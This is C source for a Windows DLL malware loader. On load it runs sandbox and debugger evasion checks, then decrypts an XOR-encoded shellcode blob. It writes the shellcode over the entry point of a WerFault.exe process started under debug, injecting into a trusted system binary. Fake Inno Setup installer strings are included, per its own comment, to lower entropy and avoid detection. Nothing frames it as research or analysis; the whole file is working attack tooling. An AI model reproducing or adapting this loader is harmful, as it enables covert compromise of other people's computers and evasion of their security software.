#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

#pragma warning (disable:4996)

//Pseudo handle
#define NtCurrentProcess() ((HANDLE)-1)

// wchar for CreateProcessW
#define TARGET_PROCESS L"C:\\Windows\\System32\\WerFault.exe"

// XOR key
const unsigned char key[] = "\x32\x37\x30\x32\x31\x30\x30\x30\x5a\x30\x63\x31\xa4\x38\xfa\xdd";
unsigned char shellcode[] = "\xce\x7f\xb3\xd6\xc1\xd8\xf0\x30\x5a\x30\x22\x60\xe5\x68\xa8\x8c\x56\x7a\x06\xe2\x57\x79\xbb\x62\x50\x12\xbb\x31\x29\xec\xb3\xa8\xfd\x48\xb9\x45\x60\x7a\x3e\x87\x7a\x7a\x17\x01\xaa\x79\x95\xf8\x56\xe1\x61\x4e\x35\x1c\x12\x70\xf1\xf9\x3d\x1b\x31\xa2\xd3\x49\x6a\xbb\x8c\x48\xb9\x65\x10\xb9\x73\x0c\x78\x31\x8a\xbb\xe3\xb9\xa4\x38\xfa\x95\x85\xf2\x43\x57\x7a\x30\xe0\x60\xbb\x12\x28\x27\xba\xe4\x18\xb3\xdc\xd0\xd1\x61\x78\xcd\xf8\x71\xbb\x04\xd2\x78\x62\xe7\xe9\x09\x33\x95\x31\xf2\x9b\x71\xf3\xf8\x3d\x71\x31\x9b\x08\x83\x44\x55\x74\xf9\x91\x24\x3a\x72\x09\xe3\x44\xe8\x68\x74\xd1\x70\x47\x78\xa5\xe8\x9c\x9c\x8b\x3e\x7f\x74\xb9\x71\x2c\x79\x31\x8a\x71\xe8\x35\x2c\x70\xfb\x0d\x41\x6a\x76\x68\x6c\x68\x6a\x71\x68\x1b\x69\x22\x6b\xec\xbb\x16\xfd\x41\x60\xc8\xd0\x6a\x70\x69\x6a\x78\xd1\x22\x8a\x66\x5b\xc7\x05\x80\x49\x8c\x40\x43\x00\x6e\x03\x02\x30\x5a\x71\x35\x78\x2d\xde\xb2\x5c\xec\x92\x36\x30\x32\x78\xb9\xd5\x79\xe6\x32\x63\x20\xf8\xf8\x52\xdd\x7a\x73\x63\x79\xbb\xd5\x7c\xb9\xc1\x1b\x8a\x2f\x46\x82\x3f\x05\x08\x4c\xbb\xdd\x58\x33\x30\x30\x30\x69\x1b\x8a\x4a\xb1\xcf\x38\x05\x08\x50\x62\x7a\x01\xfb\x7c\x01\xf0\x78\xa5\xf0\x2b\xb8\x66\x70\x05\x1d\x48\xbb\xf6\x71\x88\xdb\x3f\xef\xd0\xa5\xe5\x2b\xb8\x63\x52\xea\x9c\x58\x7e\xbe\xd2\x7a\xb8\xc9\x71\x8a\xc3\x95\x17\x50\x5b\xed\xb2\x5c\xc4\x72\x35\x30\x32\x78\x88\x53\x5d\x3e\x30\x63\x31\xa4\x38\xbb\x8d\x41\x62\x7f\xb9\xd0\x66\x67\x67\x7d\x6b\xf0\x09\x3c\xfd\x79\xaa\x3f\xfc\x54\xf0\x74\x16\x65\x31\x31\x78\xd7\x74\x47\x29\x62\x38\x92\x95\x89\xd4\x61\x60\x73\x61\x71\x60\x71\x0a\x79\x9c\xf1\xe5\x68\xb3\x22\xc8\x7f\xbe\xf1\x7e\xb8\xf1\x71\x8a\x23\xfc\x5c\xb7\x5b\xed\xb2\xec\xd2\x7a\xc8\xfa\xb9\x3f\x71\x8a\x38\xdd\x2d\x03\xce\x71\x83\x0a\x68\xa2\x64\x76\x8a\x94\xa4\x8d\xad\xcf\x8f\x78\xe0\xf5\x8c\x04\xfc\xa1\x0a\xb2\xcc\xd0\x47\x34\x8b\x77\x23\x28\x5f\x09\x31\xfd\x79\x73\x07\xff\xe7\x37";

// Strings for the Inno Setup installer
// Lowering the entropy
const unsigned char a1[] = "Inno Setup version 5.5.1.ee1 (u) Copyright 1997-2012 Jordan Russell";
const unsigned char a2[] = "Portions Copyright 2000-2012 Martjin Laan";
const unsigned char a3[] = "Setup will install %s into the following folder.";
const unsigned char a4[] = "To continue, click Next. If you would like to select a different folder, click Browse.";
const unsigned char a5[] = "Agree";
const unsigned char a6[] = "Cancel";
const unsigned char a7[] = "At least %s MB of free disk is required.";
const unsigned char a8[] = "Next";
const unsigned char a9[] = "Please read the following License Agreement. You must accept the terms of this agreement before continuing with the installation.";
const unsigned char a0[] = "I accept the agreement";
const unsigned char a11[] = "I do not accept the agreement";
const unsigned char a12[] = "Setup";
const unsigned char a13[] = "It is recommended that you close all other applications before continuing.";
const unsigned char a14[] = "Install";
const unsigned char a15[] = "Modify";
const unsigned char a16[] = "Repair";
const unsigned char a17[] = "Remove";
const unsigned char a18[] = "Click Next to continue, or Cancel to exit Setup.";
const unsigned char a19[] = "Select the components you want to install; clear the components you do not want to install. Click Next when you are ready to continue.";
const unsigned char a20[] = "Full installation";
const unsigned char a21[] = "Minimal installation";
const unsigned char a22[] = "Installation succeeded.";

VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        if (j >= sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}

// Evasion checks START
int CheckSleepForwarding() {
    DWORD startTime = GetTickCount();
    Sleep(2000);
    double elapsedTime = (GetTickCount() - startTime) / 1000.0;
    return (elapsedTime < 1.5) ? -1 : 0;
}

int CheckDebuggerPresence() {
    return IsDebuggerPresent() ? -2 : 0;
}

int CheckApiEmulation1() {
    return (FlsAlloc(0) == NULL) ? -3 : 0;
}

int CheckApiEmulation2() {
    return (VirtualAllocExNuma(NtCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0) == NULL) ? -4 : 0;
}

int CheckExecControl() {
    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "wuauctl");
    return (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS) ? -5 : 0;
}
// Evasion checks END

int InitEvasion() {

    if (CheckSleepForwarding() < 0) return -1;
    if (CheckDebuggerPresence() < 0) return -2;
    if (CheckApiEmulation1() < 0) return -3;
    if (CheckApiEmulation2() < 0) return -4;
    if (CheckExecControl() < 0) return -5;

    return 0; // all passed
}

DWORD WINAPI PH_Inject(LPVOID lpParameter) {

    STARTUPINFOW        si = { .cb = sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    DEBUG_EVENT         DebugEvent = { 0 };

    if (!CreateProcessW(TARGET_PROCESS, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &si, &pi)) {
		return -7; // process creation failed
    }

	//wait for the process to start
    if (!WaitForDebugEvent(&DebugEvent, INFINITE)) {
        // bailout
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
		return -8; // wait failed (lol)
    }

    // CREATE_PROCESS_DEBUG_EVENT gives a handle to the main thread and entrypoint address
    // overwrite that entrypoint with shellcode
    PVOID pEntryPoint = DebugEvent.u.CreateProcessInfo.lpStartAddress;

    XorByInputKey(shellcode, sizeof(shellcode), (PBYTE)key, sizeof(key));

    SIZE_T sBytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, pEntryPoint, shellcode, sizeof(shellcode), &sBytesWritten) || sBytesWritten != sizeof(shellcode)) {
        // bailout
        TerminateProcess(pi.hProcess, 1);
        DebugActiveProcessStop(pi.dwProcessId); // detach on failure
        ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
		return -9; // write failed
    }

    // zero'd local shellcode buffer
    memset(shellcode, '\0', sizeof(shellcode));

    if (!DebugActiveProcessStop(pi.dwProcessId)) {
        return -10; //detach failed
    }

    // cleanup 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    HANDLE hThread = NULL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (InitEvasion() < 0) {
            return FALSE; // evasion failed
		}
        DisableThreadLibraryCalls(hModule);
        hThread = CreateThread(NULL, 0, PH_Inject, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}